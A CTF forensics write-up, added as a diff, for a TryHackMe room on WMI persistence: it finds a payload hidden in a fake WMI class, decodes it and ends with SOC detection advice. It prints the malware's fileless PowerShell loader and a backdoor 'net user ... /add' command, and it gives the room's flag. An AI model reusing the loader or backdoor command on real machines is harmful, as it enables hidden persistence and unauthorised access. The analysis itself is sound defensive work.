@@ -1,0 +1,121 @@
+# Room Name - TryHackMe: After Hours
+Date: 07 August 2026
+Difficulty: Medium
+Category: Forensics / Windows / Reverse Engineering / WMI Persistence
+
+# Scenario
+Long after the front desk closes and the pool lights dim, the resort's back-office machines keep humming. Something has been logging in during the small hours, well after the night-shift technician has gone home. Nothing shows up in Startup, Scheduled Tasks, or the registry Run keys. Whatever is keeping itself alive is hiding somewhere quieter, in a corner of the system most tools do not think to check.
+
+# Tools Used
+- TryHackMe Attack Box
+- Terminal (bash)
+- Python 3 (dissect.cim, base64, zlib)
+- monodis (Mono IL disassembler)
+- strings
+- unzip
+- file
+
+# What I Did
+
+**Step 1 — Extract the task files**
+- Located the encrypted attachment in the luggage room and extracted it using the provided passphrase:
+```
+mkdir -p /home/claude/after-hours
+cd /home/claude/after-hours
+unzip -P Aft3rH0ursAtt4chm3ntP4ss /root/Rooms/hacker-holidays-2026/after-hours/<archive>.zip -d .
+```
+- Identified the extracted files as Windows CIM repository artifacts: INDEX.BTR, OBJECTS.DATA, and MAPPING1.MAP through MAPPING3.MAP.
+
+**Step 2 — Identify the artifact type and install analysis tooling**
+- Ran file against the extracted files to confirm they were WMI CIM repository components.
+- Installed the dissect.cim Python library for parsing the binary CIM format:
+```
+pip install dissect.cim --break-system-packages
+```
+
+**Step 3 — Search the raw OBJECTS.DATA for suspicious strings**
+- Before parsing with the library, ran strings to find obvious indicators of malicious content:
+```
+strings -n 8 OBJECTS.DATA | grep -iE "powershell|cmd\.exe|base64|frombase64|iex |invoke-expression|http://|https://|\.ps1|certutil|mshta|regsvr32|rundll32" | sort -u
+```
+- Found references to powershell.exe with a -enc flag and cmd /C invocations, confirming malicious payloads were embedded in the CIM repository.
+
+**Step 4 — Parse the CIM repository and locate the malicious class**
+- Used dissect.cim to open and walk the CIM namespace tree:
+```python
+from dissect.cim import CIM
+cim = CIM.from_directory(".")
+cimv2 = cim.namespace("root").namespace("cimv2")
+for cls in cimv2.classes:
+    if cls.class_name == "Win32_HardwareTelemetry":
+        print(cls.properties)
+```
+- Found a suspicious custom class named Win32_HardwareTelemetry masquerading as a legitimate WMI hardware class.
+- Extracted the ConfigData property which contained a Base64-encoded compressed payload.
+
+**Step 5 — Decode and decompress the embedded payload**
+- Decoded the Base64 value and decompressed the raw deflate stream:
+```python
+import base64, zlib
+raw = base64.b64decode(payload_b64)
+decompressed = zlib.decompress(raw, -15)
+with open("payload.bin", "wb") as f:
+    f.write(decompressed)
+```
+- Confirmed payload.bin was a .NET assembly (PE file).
+
+**Step 6 — Disassemble the .NET assembly**
+- Installed monodis and disassembled the assembly to IL:
+```
+apt-get install -y mono-utils
+monodis --output=payload.il payload.bin
+grep -n "ldstr\|Equals\|Arguments\|FileName" payload.il
+```
+- Found an embedded PowerShell command and a net user command with a Base64 argument.
+
+**Step 7 — Decode the embedded PowerShell command**
+- The PowerShell -enc payload decoded to a script that read the ConfigData property from Win32_HardwareTelemetry, decompressed its value, loaded the resulting bytes as a .NET assembly via Reflection, and invoked its entry point — a fileless in-memory execution chain:
+```powershell
+$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
+$o = New-Object IO.MemoryStream;
+$d = New-Object IO.Compression.DeflateStream(
+    [IO.MemoryStream][Convert]::FromBase64String($file),
+    [IO.Compression.CompressionMode]::Decompress);
+$b = New-Object Byte[](1024);
+$r = $d.Read($b,0,1024);
+while($r -gt 0){
+    $o.Write($b,0,$r);
+    $r = $d.Read($b,0,1024);
+}
+[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null
+```
+
+**Step 8 — Extract the flag from the net user command**
+- Found the following command embedded in the assembly:
+```
+cmd.exe /c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add
+```
+- Decoded the Base64 argument:
+```python
+import base64
+print(base64.b64decode('VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9').decode())
+```
+- Revealed the flag used as the password for a backdoor user account named patch.
+
+# What I Found
+- Persistence mechanism: WMI CIM repository class (Win32_HardwareTelemetry in root\cimv2)
+- Payload storage: Base64-encoded deflate-compressed .NET assembly stored in a WMI class property (ConfigData)
+- Execution method: Fileless in-memory .NET assembly load via Reflection.Assembly.Load triggered by a PowerShell -enc command
+- Backdoor action: net user patch <flag_as_password> /add (creating a local user named patch)
+- Flag: THM{P4tch_op3ned_th3_BacKd00r}
+
+# Key Learning
+WMI (Windows Management Instrumentation) is one of the stealthiest persistence mechanisms available to attackers because standard autoruns tools such as Autoruns, Scheduled Tasks, and registry Run key scanners do not inspect the CIM repository. An attacker can store an entire encrypted and compressed payload inside a custom WMI class property and execute it via a WMI event subscription or a PowerShell command that reads the property at runtime, producing a fileless execution chain that leaves no binary on disk. The payload here used three obfuscation layers: Base64 encoding, deflate compression, and .NET reflection-based assembly loading, each layer designed to defeat a different class of detection. Forensic analysis required parsing the raw CIM binary files directly using dissect.cim rather than relying on live WMI queries.
+
+# What I Would Flag in a Real SOC
+- Custom WMI classes in the root\cimv2 namespace with names mimicking legitimate Microsoft classes such as Win32_HardwareTelemetry are a strong indicator of WMI-based persistence and should be detected by periodic CIM repository auditing against a known-good baseline
+- WMI event subscriptions and class modifications are logged in Microsoft-Windows-WMI-Activity/Operational and should be forwarded to the SIEM, any new permanent WMI subscription or class creation outside of a change window should trigger an alert
+- PowerShell processes launched with -Sta -Nop -Window Hidden -enc flags from a cmd.exe parent are a high-confidence malicious execution pattern, these arguments suppress the window, disable the profile, and pass an encoded command specifically to evade logging and inspection
+- Reflection.Assembly.Load called on a byte array constructed at runtime is the standard pattern for fileless .NET malware execution, EDR products must detect in-memory assembly loads from non-standard sources rather than relying solely on file-based scanning
+- The net user /add command using a Base64 string as the password is a creative but detectable persistence technique, all local account creation events (EventID 4720) should be alerted on in any environment where local account management is not an expected administrative activity
+- Backdoor accounts named after known personas in the environment (patch is a character in the Hacker Holidays storyline) indicate attacker awareness of internal naming conventions, user account audits should compare all local accounts against an authorised list and flag any unrecognised entries immediately
